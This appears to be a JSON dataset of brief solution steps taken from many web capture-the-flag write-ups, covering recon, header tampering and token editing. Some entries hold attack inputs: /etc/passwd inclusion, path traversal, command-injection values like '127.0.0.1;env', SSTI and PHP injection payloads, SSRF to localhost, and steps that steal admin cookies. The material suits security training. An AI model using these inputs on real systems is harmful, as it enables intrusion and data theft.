[
    "Visited the website.",
    "Observed redirection to '/?file=wc.php'.",
    "Visited '/?file=/etc/passwd'.",
    "Visited '/?file=checkpass.php'.",
    "Accessed the webpage.",
    "Locate the route '/login' in the website source.",
    "Locate the route '/adminNames' in the website source.",
    "Visit the '/login' route.",
    "Observe the form to fill.",
    "Submit the form.",
    "Navigate to the '/adminNames' route.",
    "Observe that it prompts a file download.",
    "Visit the GitHub URL.",
    "Experiment with the '/getFile?file=...' route.",
    "Visit the '/admin' route.",
    "Send a GET request.",
    "Receive a response text.",
    "Pass ['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js'] as an array via the GET parameter",
    "Send a GET request to the server",
    "Include the parameter `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` in the request",
    "Signify checking out the website's 'robots.txt'",
    "Open the website",
    "Observe that the website serves an 'index.html' file",
    "Discover a disallowed route '/fade/to/black'",
    "Access the website",
    "Use 'window.localStorage.getItem' to check our input password against the split parts",
    "Access the URL",
    "Find the input box",
    "Click the submit button",
    "Submit a CSS selector for a potential starting letter of the password",
    "Repeat for all potential starting letters",
    "Visit the URL with the payload '?icecream={{globals()}}'.",
    "Pass this hash with the GET parameter 'hash' to the server.",
    "Sent the payload to the challenge webpage URL using a POST request",
    "Sent a GET request to access the cache data",
    "Determine that the challenge requires interaction with a Flask application.",
    "Access the source URL",
    "Open the URL in a browser",
    "Open the Browser Devtools",
    "Locate the captcha boxes on the screen",
    "Click on a captcha box",
    "Repeat the previous substep 4 more times",
    "Locate the 'GET FLAG' button",
    "Click on the 'GET FLAG' button",
    "Select and copy the flag",
    "Open the website 'very.uniquename.xyz:8880'",
    "Set the language headers to Swedish",
    "Open the link 'very.uniquename.xyz:2052'",
    "Observe the page showing logos of Xbox and Linux",
    "Change User-Agent to 'Linux' using a curl command",
    "Notice the Linux logo is gone from the page",
    "Change User-Agent to 'Linux Xbox' using curl",
    "Open web browser.",
    "Enter the URL 'overly.uniquename.xyz:2095'.",
    "Change the HTTP method to POST.",
    "Locate the 'User-Agent' header in the HTTP request.",
    "Change the 'User-Agent' header to mimic a Google bot.",
    "Locate the 'Referer' header in the HTTP request.",
    "Set the 'Referer' header as 'google.com'.",
    "Locate the 'Cookie' header in the HTTP request.",
    "Locate the 'Content-Type' header in the HTTP request.",
    "Set the 'Content-Type' as 'application/json'.",
    "Open the body of the HTTP request.",
    "Send POST request to server",
    "Check if response contains 'check' string",
    "Opened the given link",
    "Checked the network tab",
    "Sent a curl request",
    "Received a response",
    "Sent another curl request",
    "The payload is sent to the target URL via POST request.",
    "The process includes sending the POST request, extracting the cookie, and getting the flag",
    "Visit the website.",
    "Visit a non-existent route starting with '/admin/'.",
    "Trigger a 404 error page.",
    "Connect to the URL http://jh2i.com:50000",
    "Change the User-Agent header in the request",
    "Send a GET request to the URL",
    "Modify the User-Agent",
    "Open a browser.",
    "Enter the given URL in the address bar.",
    "Open the developer tools on the browser.",
    "Navigate to the 'Sources' tab in the developer tools.",
    "Open a web browser.",
    "Visit the URL: https://redpwn.net/",
    "Open the web browser.",
    "Press the 'Ctrl' key on the keyboard.",
    "While holding the 'Ctrl' key, press the 'U' key on the keyboard.",
    "View the HTML source code.",
    "Search for a string formatted as 'flag{...}' in the HTML source code.",
    "Read the HTML source code.",
    "Access the content attribute of the identified meta tag containing the flag.",
    "Visit the source URL provided for the challenge.",
    "Submit the manipulated username and password.",
    "Receive an alert from the website.",
    "Read the flag from the alert.",
    "Navigate to the '/api/flag' endpoint using the modified token.",
    "Retrieve the flag from the response received after visiting the '/api/flag' endpoint.",
    "Check for HTML input acceptance.",
    "Note that HTML tags are not allowed.",
    "Add the encoded payload to the URL.",
    "Admin Bot visits the URL.",
    "Notice the website allows HTML input.",
    "Ensure the site URL in the payload is using HTTPS.",
    "Prevent Content Security Policy Bypassing.",
    "Send the generated webpage to the website.",
    "Receive and log the cookie transferred as a query parameter.",
    "Send the generated webpage URL.",
    "Send the URL to the 'admin bot'.",
    "Visit 'http://web.zh3r0.ml:7777/?page=flag'",
    "Check if an 'upload' page exists",
    "Confirm the existence of the 'upload' page",
    "Search for the flag on the browser",
    "Visit route '/?page=payload'",
    "Search in the source code for the flag's presence",
    "Access the provided source code and link to the running instance.",
    "Examine the login screen.",
    "Examine the main screen with book selections.",
    "Login with given credentials using the Google Chrome Network tab.",
    "Capture the payload of the response, identifying the included JWT token.",
    "Observe the site providing a link to the running instance.",
    "Started the instance on picoCTF.",
    "Analyzed the web page.",
    "Opened the developer tools in the browser (F12 -> Sources in Google Chrome).",
    "Inspected the static resources of the web page.",
    "Inspected the index.html file.",
    "Identified the endpoint for the POST request.",
    "Clicked a button on the website.",
    "Sent the request to '<url_of_site>/data'.",
    "Notice a redirection with 302 Found to /index.php.",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard.",
    "Clarified how to start the app locally using a non-privileged port",
    "Intended to display the flag on the welcome page",
    "Identify the app as a page.",
    "Notice the requests being made to the API endpoint.",
    "Send a request body.",
    "Customize the request body.",
    "Identify the application as a WordPress site.",
    "Discover clickable links that reveal 2 blog posts.",
    "Find the blog post page '?p=1'.",
    "Notice that comments need to be approved.",
    "Observe the change in the URL after submitting a comment.",
    "Observe two <link> tags.",
    "Find the webpage of the 'Modern events calendar' plugin.",
    "Accessed the site.",
    "Attempted '127.0.0.1;ls .' in the URL.",
    "Used '127.0.0.1;echo $PWD' in URL.",
    "Used '127.0.0.1;env' in URL.",
    "Observe the text of the challenge that refers to 'robots'.",
    "Check the 'robots.txt' file for the disallowed path.",
    "Open the '/g00d_old_mus1c.php' path.",
    "Observe that the path '/' lists information including server source code.",
    "Observe that parentheses and some keywords are blocked.",
    "Append the payload '?payload=directory`flag`' to the URL of the webpage.",
    "Visited the website.",
    "Confirmed buttons trigger standard Linux commands.",
    "Found 'ups_status' and 'restart_ups' commands return output from local web server.",
    "Access the browser's developer tools.",
    "Access the browser's developer tools.",
    "Observe the post-login page.",
    "Identify the `/api/toylist` endpoint and its behaviour.",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
    "After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Visit an online barcode generator website.",
    "Access the website's file upload functionality.",
    "Inspect the returned results after uploading the barcode.",
    "Navigate to the bottom of the results.",
    "Analyze the website.",
    "Submit the payload through the form.",
    "Receive the output displaying the flag.",
    "Navigate to the '.github/workflows' directory",
    "Access the website.",
    "Echo back the flag.",
    "Pass things in the textbox",
    "Open the website in a web browser",
    "Search for comments within the HTML source code",
    "Enter the website URL in Dirb",
    "Access the specified path in the website",
    "Enter the website.",
    "Notice that one of the mentioned company names points to 'Robots.txt'.",
    "Visit the robots.txt page for the site.",
    "Find a message about using an unsupported browser, more specifically Internet Explorer 6.01.",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser.",
    "Reload the website page with the new user-agent.",
    "Go to 'Inspect' -> 'Storage' -> 'Cookies'.",
    "Intercept an HTTP request or use a cookie editor tool.",
    "Press 'login' on the login page.",
    "Access the site and find the flag.",
    "Get redirected to the flag page.",
    "Open the webpage in a web browser",
    "Open the inspection tools in the web browser",
    "Navigate to the sources tab in the inspection tools",
    "Reload or refresh the webpage",
    "Attempted to purchase 'flag' but failed.",
    "Made HTTP GET requests to the provided URL.",
    "Visited the URL provided by the successful attack and obtained the flag.",
    "Directory wasn't directly browsable or clonable",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Visited the challenge link",
    "Constructed the POST request with 'user' and 'pass' parameters",
    "Set the values of 'user' and 'pass' as 'karma'",
    "Sent the POST request",
    "Constructed a POST request to the '/flag' endpoint",
    "Sent the POST request",
    "Received the response",
    "Constructed a POST request to the '/flag' endpoint",
    "Sent the POST request",
    "Received the response",
    "Open the provided challenge link",
    "Observe the website redirection to '/flag'",
    "Read the message displayed: 'Not admin, no flag for you'",
    "Go to jwt.io",
    "Navigate to /flag",
    "Inspected cookies.",
    "Attempted to access the /flag directory.",
    "Navigate to the /flag URL.",
    "Retrieve the flag",
    "Analyze the URL 'http://35.207.189.79/pyserver/server.py'.",
    "Access the provided URL.",
    "Input 'Accept-Language: ....//....//....//....//flag' in the HTTP header.",
    "Prepare a GET request to the URL 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg'.",
    "Send the prepared GET request, making the server believe that the request is coming from the same host.",
    "Receive the server's response.",
    "Use the URL 'http://35.207.189.79/api/login'",
    "Complete the login on the website",
    "Visit the given URL http://35.207.91.38/robots.txt.",
    "Observe a disallowed directory: /backup/.DS_Store.",
    "Visit http://35.207.91.38/backup/.DS_Store.",
    "Access the website.",
    "Specify the URL http://35.207.120.163.",
    "Access the website from the challenge.",
    "Submit a note.",
    "Submit a note.",
    "Receive a link to the note.",
    "Analyze the website's HTML.",
    "Find the comment indicating the source code location.",
    "Find that the read endpoint is '/admin'.",
    "Understand that it performs an HTTP GET call.",
    "Understand the interpretation of the GET call.",
    "Access the initial webpage",
    "Visited the challenge website",
    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Access the website homepage",
    "Modify the value of 'admin_id' cookie to '1'",
    "Refresh the page",
    "Access the website home page.",
    "Identify the transmission of positions to the client.",
    "Visit the website mentioned in the challenge",
    "Access the URL `https://xmas.2020.chall.actf.co/post`",
    "Post the crafted message",
    "Observe the website returning a code",
    "Access the URL `https://xmas.2020.chall.actf.co/report`",
    "Access the URL `https://xmas.2020.chall.actf.co/admin`",
    "Send the request and receive a response",
    "Visit the provided URL.",
    "View the website contents.",
    "Download the file named configs.zip.",
    "Make a GET request to /secret.html.",
    "Observe that the contents of 'secret' tags are replaced with 'Protected'.",
    "Make a GET request with a 'Range' HTTP header to exfiltrate the original /secret.html page.",
    "Received the URL https://poems.asisctf.com/ as part of the challenge.",
    "Visited the URL which led to a website containing a list of books.",
    "Identified two actions 'an excerpt' and 'read online' on the website.",
    "Noticed that 'read online' opens a link from an unrelated domain.",
    "Figured out that the homepage is loaded as a result of an HTTP GET request to '/books.php?type=list'.",
    "Noticed an excerpt button on the webpage.",
    "Observed that clicking on the excerpt button makes an HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "Identified that the 'read online' button opens a new window upon clicking.",
    "Realized that the new window redirects to a unique link for each book.",
    "Created a malicious URL.",
    "Created a new malicious URL.",
    "Executed the new URL.",
    "Connect to the given URL.",
    "Choose reading another HTTP GET parameter.",
    "Use 'phpinfo' page to check if the payload is operational.",
    "Analyze the HTML of the page.",
    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php.",
    "Contact the discovered endpoint based on the decoded strings.",
    "Perform a GET request to the discovered endpoint.",
    "Perform a POST request to the path provided by the decoded message.",
    "Perform another POST request.",
    "Connect to URL",
    "Find default Apache2 installation page",
    "Identify server directories",
    "Visited the challenge webpage",
    "Checked the webpage source",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Performed a HTTP GET request",
    "Added a header named 'answer'",
    "Accessed the website.",
    "Found out it is an online calculator.",
    "Made a POST request to the server.",
    "Access the website",
    "Make a POST request",
    "Analyzed the webpage.",
    "Noticed 'frequency' increments with each page refresh.",
    "Script retrieves cookies from the target page.",
    "Attempted to connect to the homepage.",
    "Received an error of HTTP method not allowed.",
    "Server returned all allowed methods.",
    "Experimented with each method.",
    "Guessed the presence of endpoints.",
    "Tried all HTTP verbs for each endpoint.",
    "Received different responses from the '/two/' endpoint with 'PUT' HTTP verb.",
    "Received different responses from the '/two/' endpoint with 'CONNECT' HTTP verb.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Guessed the requirement of an 'application/x-www-form-urlencoded' parameter.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint.",
    "Received a message from the '/vim/quit/' endpoint.",
    "Attempted to connect to the homepage.",
    "Experimented with each method.",
    "Guessed that endpoints were present.",
    "Tried all HTTP verbs for each endpoint.",
    "Received a webpage from '/com/seaerch/' endpoint.",
    "Guessed that 'application/x-www-form-urlencoded' parameter must be used.",
    "Used the 'flag' value on '/com/seaerch/' endpoint.",
    "Received a message from '/vim/quit/' endpoint.",
    "Passed a random value on the endpoint.",
    "Connect to the website",
    "Observe that directory listing is active",
    "Observe the contents of the first page",
    "Note that the message 'Not authenticated' is displayed",
    "Accessed the meme generator web application",
    "Experimented with the meme generator functionality",
    "Accessed the meme generator web application.",
    "Engaged with different features of the meme generator.",
    "Formulated an XML HTTP request.",
    "Recognize 'SSTI' in the given URL",
    "Display the content of 'flag.txt' remotely using the identified class",
    "Visit the website http://easy-php.darkarmy.xyz/",
    "Visit http://easy-php.darkarmy.xyz/robots.txt",
    "Open http://easy-php.darkarmy.xyz/?lmao",
    "Download all the contents of the Git repository from the website.",
    "Visit the website",
    "Read HTML",
    "Note that the PHP shell can be executed by visiting the uploaded file",
    "Connected to the provided web site.",
    "Observed User-Agent details.",
    "Observed an image printed as a response to the login.",
    "Access the website 'http://filereader.darkarmy.xyz/'",
    "Identify the upload form on the website",
    "Accessed the provided URL.",
    "Identified the required user-agent according to the code.",
    "Constructed the 'GET' request using 'darkctf', 'ctf2020', 'karma', and '2020' query parameters.",
    "Set the 'User-Agent' as per the requirement in the PHP code.",
    "Sent the 'GET' request to the provided web page.",
    "Received the response from the web page.",
    "Visit the challenge URL",
    "Find a different URL 'https://freewifi.ctf.umbccd.io/staff.html' in the packet",
    "Access the new URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Intercept a GET request to /jwtlogin",
    "Send a GET request to /jwtlogin",
    "Access the website at 'http://freewifi.ctf.umbccd.io/'.",
    "Observe the presence of a CSRF token.",
    "Connect to the website.",
    "Perform a POST request.",
    "Visit the provided URL",
    "Locate an image tag",
    "Check the URL parameter of the image tag",
    "Retrieve the flag from the URL parameter",
    "Visit the given URL",
    "Find an image tag",
    "Identify the onclick track event",
    "Find the onclick attribute",
    "Open the JavaScript console in the web browser",
    "Observe a login form with JavaScript check.",
    "Discover that the script can be bypassed by disabling JavaScript.",
    "Discover that the script can be bypassed by using a proxy tool for request interception and repetition.",
    "Access the website.",
    "Observe allowed actions: upload and comment on dog pictures.",
    "Find the endpoint '/dogooo/runcmd' enabling remote shell functionality.",
    "Identify the publicly accessible functionality '/dogooo/deets/<postid>'.",
    "Observe the submission of comments as a two-step process.",
    "Observe the redirection upon successful authentication.",
    "Note that the redirected URL contains the flag.",
    "Identify the flag in the URL.",
    "Accessed the web application.",
    "Used the GUID to retrieve the content.",
    "Executed a GET request.",
    "Retrieved a POST request.",
    "Send the crafted POST request to the server",
    "Receive an HTTP response containing the Flag",
    "Made a GET request with the payload.",
    "Connect to website",
    "Get link to the source code",
    "Reveal the structure of the site",
    "Understand that it allows the creation and sharing of messages",
    "Find that content of the note is inserted into the HTML",
    "Craft another post request",
    "Visit the home page of the challenge URL",
    "Read the blog post on the home page",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt'",
    "Read the content of the 'robots.txt' file",
    "Identify the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin' from the 'robots.txt' file",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin'",
    "Note that the post ID is sent as a URL fragment",
    "Started the CTF Challenge in Houseplant CTF 2020 \u2013 Fire/place.",
    "Received instructions about the presence of certain elements inside the HTML page.",
    "Explored the Firestore environment and found a canvas for users.",
    "Opened the browser console.",
    "Started interacting with the Firebase installation using the browser console.",
    "Visited the webpage.",
    "Typed the URL 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce' in the web browser and visited the webpage.",
    "Find the endpoint of the QR code service.",
    "Receive a QR code of the letter 'X'.",
    "Access the given URL.",
    "Click on the link to enter the chat.",
    "Receive an HTTP 200 OK status code.",
    "Follow the redirection link after replacing the 'with' value with 'flag'.",
    "View the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Access the challenge PHP URL",
    "Build URL",
    "Add GET parameter to final URL",
    "Identify the first check.",
    "Observe that the first check points to a GET parameter with underscores.",
    "Recognize that query string cannot have underscores.",
    "Craft a URL using the identified character.",
    "Use the newly crafted URL for the website response check.",
    "Formulate the final URL.",
    "Include the necessary characters in the final URL.",
    "Use the final URL.",
    "Send a request to the server using the final URL.",
    "Identify the page as having an Apache2 default index.",
    "Look for any hidden or obscured data.",
    "Request http://104.197.168.32:17012/bashferno.cgi.",
    "Access the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt.",
    "Access the challenge website.",
    "Download the 'print-flag' file by accessing 'http://lowdeep.insomnihack.ch/print-flag'.",
    "Connect to the challenge website",
    "Note the output shown upon submitting an article",
    "Note the reference to a potentially fake flag",
    "Connect to the website at http://10.255.0.1:8010/",
    "Visit the private section of the website",
    "Access the website.",
    "Observe functionality to create custom cowfiles via the URL: `http://3.93.128.89:1204/cow_designer`.",
    "Send an HTTP POST request via the /cow_designer page.",
    "Observe that the flag is: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Open the URL with a browser",
    "Note the redirection to Google",
    "GET the page",
    "Note the returned HTML",
    "Note the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "POST the page",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/.",
    "Refreshed the page.",
    "Navigate to the S3Scanner directory",
    "Navigate into the bucket directory",
    "Connected to the website",
    "Experienced multiple redirections from one page to another",
    "Tuned the starting point of the redirection",
    "Connect to http://ctfchallenges.ritsec.club:3000.",
    "Connect to http://ctfchallenges.ritsec.club:4000.",
    "Attempt to connect to http://ctfchallenges.ritsec.club:4000/api/normal.",
    "Make a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0.",
    "Make another GET request to obtain the signing certificate from the platform.",
    "Make a GET request to the /api/admin endpoint with the new JWT.",
    "Connect to the website",
    "Discover HTML comment",
    "Recognize image upload functionality",
    "Notice lack of content verification or removal of unwanted content",
    "Perform image file upload",
    "Access the given URL",
    "Enter the token into the provided form field",
    "Access the provided URL",
    "Submit the form",
    "Visit the website.",
    "Access Symfony profiler interface.",
    "Connect to 'https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php'.",
    "Visit 'https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env'.",
    "Access the website hosting CTF.",
    "Find the feedback form on the website.",
    "Examine the feedback form on the website.",
    "Observe the server response.",
    "Send a POST request to /feed.php.",
    "Receive a response from the server.",
    "Send a second POST request to /feed.php.",
    "Receive a response from the server.",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Find the details of the desired user under the post search section",
    "Connect to the website 'https://web5.ctfsecurinets.com/flags.php'",
    "Browsed through the blog.",
    "Attempted to navigate to '.bzr' directory.",
    "Navigated to 'branch' folder within '.bzr' directory.",
    "Receive a message indicating the site is not served on this interface.",
    "Identify that the website is under HTTPS.",
    "Connect to the website 'https://138.247.13.115.xip.io/'.",
    "Visit the website.",
    "Call the web page.",
    "Open the link provided in the CTF challenge - http://138.247.13.111",
    "Observe a web page",
    "Notice that incorrect answers submitted in the form fields are highlighted in red",
    "Check 'Is it a leap year?' checkbox",
    "Check 'I agree Security Questions are Bad.' checkbox",
    "Connect to the provided URL",
    "Identify that the website accepts a 'name' parameter",
    "Locate the 'flag.txt' file in the 'flag_is_here' directory",
    "Access the website of the challenge",
    "Access the website: http://toomanycredits.tamuctf.com",
    "Identify an interaction with the website that involves a 'counter' cookie",
    "Submit an HTTP request with the modified cookie",
    "Visit the link provided in the challenge",
    "Submit the form presented on the webpage",
    "Refresh the webpage",
    "Access the URL: http://highsource.tuctf.com/",
    "Return to the website.",
    "Visit the website.",
    "Access the target website.",
    "Observe that the website is a login form.",
    "Send a POST request to the server.",
    "Attempt to access the URL `http://3.91.17.218/.git/`.",
    "Find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.",
    "Inspect the webpage",
    "Observe the usage of JavaScript files when buttons are pressed",
    "Observe a normal interaction",
    "Receive a response",
    "Inspect the webpage.",
    "Notice that a normal interaction involves passing a productId value.",
    "Receive a response from the server.",
    "Entered the parameter '?source=1' in the HTTP request.",
    "Executed an HTTP request.",
    "Executed another HTTP request.",
    "Entered ?source=1 as an HTTP parameter.",
    "Executed an HTTP request using the constructed base.",
    "Analyzed the website behavior.",
    "Understood the layout and elements of the webpage.",
    "Understood the methods used for voting.",
    "Received the flag message returned by the server.",
    "Identify the CAPTCHA checkbox.",
    "Observe that the checkbox generates a random string.",
    "Modify the link used in the requests.get operation.",
    "Add the CAPTCHA parameter to the link.",
    "Exclude the existing private key parameter through '#'.",
    "Force the debugging private key in the link.",
    "Create a HTTP request.",
    "Make a 'POST' call.",
    "Identify a redirection URL.",
    "Follow the redirection.",
    "Access the webpage after the redirection.",
    "Understood the website allowed changing the theme via a URL parameter `theme='value'`",
    "Identified failure due to Content Security Policy",
    "Decided to use the `jsonp` method",
    "Performed cross-origin request using `jsonp`",
    "Created `/evil/` endpoint for cookie grabbing script",
    "Created `/cookie/` endpoint for receiving exploited cookies",
    "Directed the cookies from the server to the `/cookie/` endpoint",
    "Noted the title 'advertisement'.",
    "Find the /login/ endpoint using dirsearch.",
    "Add the header X-Forwarded-For to the request.",
    "Open http://18.213.16.123:5000/ in a web browser.",
    "Send a POST request to the /admin/system/refresh_session/ endpoint.",
    "Make a GET request to /login/ to trigger the deserialization.",
    "Open the provided URL.",
    "Observe a page that accepts another URL and submits it.",
    "Visit the URL provided on the page.",
    "Understand that dots, double slashes, or non-ascii dot are not allowed in the iframe value in the URL.",
    "Add the JSON payload to the URL after the first '?' character.",
    "Submit the URL.",
    "Wrote a request to the root directory",
    "'/opt' is the web facing directory",
    "Used Burp's repeater to spam 'Go'",
    "Visit the website.",
    "Investigate the behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Conclude that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Send a request to '/pleb.mysub.dnsbin.zhack.ca'.",
    "Send a request to '/pleb.127.0.0.1.nip.io'.",
    "Observe that the '/pleb' proxy isn't forwarding non-ASCII characters.",
    "Identify that it uses proxy_pass to forward requests.",
    "Access the '/admin' directory.",
    "Retrieve the X-Accel-Redirect header.",
    "Realize it is a misdirection towards '/useradmin'.",
    "Choose to target the '/uberadmin' directory.",
    "Create a request for '/admin../uberadmin/flag.txt'.",
    "Inject a double quote to break out of the alt tag.",
    "Create the final URL.",
    "Test the final URL.",
    "Submit the URL.",
    "Visit the CTF challenge site.",
    "Used 'attachment' parameter",
    "Access the site at :5555",
    "Access the migrate.php page",
    "Access the site at :7777",
    "Constructed the final payload URL",
    "Sent the request to 'http://18.179.178.246:8003'",
    "Injected an 'a' tag.",
    "Added the id=like to the injected 'a' tag.",
    "Bot clicking our link gave us the flag.",
    "Connect to the website link (http://3.112.91.135/)",
    "Observe a post message",
    "Craft another request and set the remote_addr to the required fake address.",
    "Open a web browser.",
    "Enter the provided URL in the address bar.",
    "Follow the URL redirection (if applicable) to the file location.",
    "Set the 'view options' setting",
    "Email only required to start validly",
    "Any characters allowed after the valid start of email",
    "HTML rendering by pdfkit/wkhtmltopdf",
    "Inserted the payload into the target site's URL.",
    "Use /apisix/batch-requests endpoint.",
    "Visit the targeted website.",
    "Encounter challenges while trying to navigate up directories.",
    "Attribute the challenges to the `basedir` restriction.",
    "Encounter a message saying browser is unsupported.",
    "Notice a 302 found page.",
    "Noticed a website related to the challenge.",
    "Appended `?source` to the index.php of the site.",
    "Wrote the cgi header with 'Content-type: text/html'.",
    "Opened the CTF challenge.",
    "Tried submitting possible answers.",
    "Decided to open the Network tab.",
    "Opened the Google Chrome console.",
    "Realized the flag was in the comment within the response.",
    "Identify the text input for HTML notes",
    "Identify the rendered HTML page from textarea inside an iframe",
    "Take note of the embedded iframe",
    "Take note that the embedded iframe is within the same origin",
    "Acknowledge that the bypass involves embedding the iframe",
    "Recognize that pop-ups from a sandboxed page inherit sandbox attributes",
    "Recognize that 'allow-popups-to-escape-sandbox' can prevent the inheritance of sandbox attributes by pop-ups",
    "Open a pop-up to the target URL",
    "Open the target URL",
    "Navigate to the website",
    "Right click on the webpage",
    "Select 'Inspect' or 'Inspect Element'",
    "Open the Inspect Element tool",
    "Navigate to the 'Sources' tab",
    "Inspect the webpage",
    "Understand the functionality",
    "Identify `/getflag` endpoint",
    "Identify `/cookies` endpoint",
    "Visit the `/cookies` endpoint",
    "Recognize that the page allows you to upload a custom HTML page.",
    "Recognize that you can report suspicious URLs to the admin.",
    "Recognize that the sha512.js script will be filtered as a result of appending the parameter.",
    "Explore the website interface.",
    "Recognize that the interface allows for creating redirect URLs, changing admin's password, and reporting URLs.",
    "Find the option to pass it as a URL parameter.",
    "Used request.args as the argument",
    "Ran the server locally",
    "Request 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Admin visits the page",
    "Compose a POST request for the server's login endpoint.",
    "Send the composed POST request via curl.",
    "Include the composed JSON body in the POST request.",
    "Include the manipulated cookie in the request's header.",
    "Use the browser or curl to navigate to the site's main page.",
    "Inspect the provided instance of the website.",
    "Access the support page on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account'",
    "Go to the 'Edit profile' section",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section",
    "Made the admin visit it",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Attempt to send 'POST' data to the 'profile.php' or 'manage.php'",
    "Access the website",
    "Access the 'Support' section",
    "Access the 'Edit profile' section",
    "Manually modify the 'Link to profile' field",
    "Select the first option in the 'Support' section",
    "Make the admin visit the modified 'Link to profile'",
    "Note the various constraints mentioned in the header",
    "Perform a dirbuster scan",
    "Discover the 'manage.php' page",
    "Attempt to send 'POST' data to 'profile.php' with a different 'Referrer'",
    "Attempt to send 'POST' data to 'manage.php' with a different 'Referrer'",
    "Observe the 'Permission Denied!' message",
    "Send the admin to the webpage",
    "Locate the POST requests to '/login.php'.",
    "Identify needed parameters: username, nonce, and cnonce.",
    "Understand that this shuffle is based on seeded random values tied to the 'User-Agent'.",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input).",
    "Repeat the process for characters in each WebSocket packet.",
    "Located an input field on the provided webpage",
    "Access the provided URL for the decryption service.",
    "Visit the website.",
    "Assess the functionality of the web page.",
    "Check the site's 'Bug Bounty' form.",
    "Submit suspicious URLs to be visited by a headless Chrome agent.",
    "Create a CSRF page.",
    "Use <meta name='referrer' content='no-referrer'>.",
    "Overwrite document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Construct a post form.",
    "Notice an undeleted Tweet.",
    "Share the generated URL with the admin.",
    "Make the first GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3'.",
    "Make the second GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter?oauth_token=<oauth token>&oauth_verifier=<oauth verifier>'.",
    "Accessed URL http://138.68.228.12/?is_debug=1.",
    "Realized necessity to create raw HTTP requests.",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'.",
    "Directory switching.",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request.",
    "Passed through conditions checking for specific value comparisons.",
    "Received form on alien_sector.php.",
    "Sent the request 'type=/../super_secret_shell.php'.",
    "Note that Nginx blocks '/debug*'.",
    "Note that Apache blocks '/debug*'.",
    "Use the primary segment to create a URL.",
    "Create a URL that would circumvent the '/debug*' restriction.",
    "Visit the manipulated URL.",
    "The Angular application was set up behind an Nginx reverse proxy.",
    "Successfully accessed the '/debug/answer' endpoint.",
    "Utilized a trick where Angular recognizes '\\' as '/'.",
    "Verified that Angular parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Noted the situation that even though the app was hidden behind Nginx reverse proxy.",
    "Accessed '/q' endpoint.",
    "Recognized it as part of Angular's internal methods fetching '/api/answer' from server-side.",
    "Discovered Angular uses a Host header - 'PROTOCOL + HOST + / PATH' while performing HTTP requests.",
    "Noticed Angular also follows redirects.",
    "Planned to redirect anything to '127.0.0.1/api/true-answer' to capture the flag.",
    "Executed the curl command 'curl 'http://universe.chal.ctf.westerns.tokyo/a' -H 'Host: terjanq.me'.",
    "Injected two `reCAPTCHA` buttons.",
    "Rewrote the document to `/terjanq/` using the crafted payload.",
    "Use the octal notation of 127.0.0.1 IP address.",
    "Make a HTTP request.",
    "Specify the target URL as 'http://0177.0.0.1/admin-status'.",
    "Use the DEMO application provided by singularity.",
    "Replace the RANDOM placeholder in the URL with something random.",
    "Access the found Laravel panel",
    "Perform a post request in the Laravel panel",
    "Receive a 302 response",
    "Specify the URL for the exploit",
    "Visit the webpage.",
    "Form the complete flag: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}",
    "Identify the URL 'ip.address/?lang=es.php' as a potential target for LFI.",
    "Access the login page.",
    "Note the message displayed on the front end upon attempted logins.",
    "Arrived at the support page.",
    "Observed POST request capability.",
    "Discovered the API endpoint /api/users/update.",
    "Visit the website.",
    "Received the URL and Docker file for the challenge.",
    "Accessed the website.",
    "Noticed a change in website functionality.",
    "Open the app's login page.",
    "Check the network tab.",
    "Go to a third-party website.",
    "Copy the introspection query.",
    "Paste the introspection query into BurpSuite.",
    "Send the introspection query to the graphql endpoint.",
    "Paste the introspection data received into the graphql voyager tool.",
    "Open the developer tools.",
